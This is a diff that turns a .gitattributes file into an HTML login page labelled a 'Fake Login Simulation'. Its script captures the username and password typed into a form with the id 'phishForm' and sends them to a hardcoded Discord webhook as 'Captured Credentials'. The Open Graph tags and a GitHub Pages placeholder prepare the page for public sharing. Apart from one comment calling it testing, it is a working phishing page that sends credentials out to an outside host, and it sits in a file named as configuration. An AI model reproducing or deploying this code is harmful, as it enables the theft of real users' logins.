@@ -1,2 +1,41 @@
 # Auto detect text files and perform LF normalization
-* text=auto
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Fake Login Simulation</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta property="og:title" content="Login to FakeApp" />
+  <meta property="og:description" content="Simulate a login to FakeApp." />
+  <meta property="og:image" content="https://i.imgur.com/aJtrRpE.png" /> <!-- Replace with your real image URL -->
+  <meta property="og:url" content="https://your-username.github.io/your-repo-name/" /> <!-- Your GitHub Pages URL -->
+  <meta property="og:type" content="website" />
+</head>
+<body>
+  <h2>Login to FakeApp</h2>
+  <form id="phishForm">
+    <input type="text" id="username" placeholder="Username" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <button type="submit">Login</button>
+  </form>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1375878014696689704/SBUc7GOCDoZ9L5AxsAPWD0FjdKtCblVf7i17e5dvoJrKhItchMKKhg06VHWy7ob7HbY9"; // For controlled testing ONLY!
+
+    document.getElementById("phishForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `Captured Credentials:\nUsername: ${username}\nPassword: ${password}`
+        })
+      }).then(() => alert("Simulation complete. Credentials sent to webhook (in controlled environment)."));
+    });
+  </script>
+</body>
+</html>
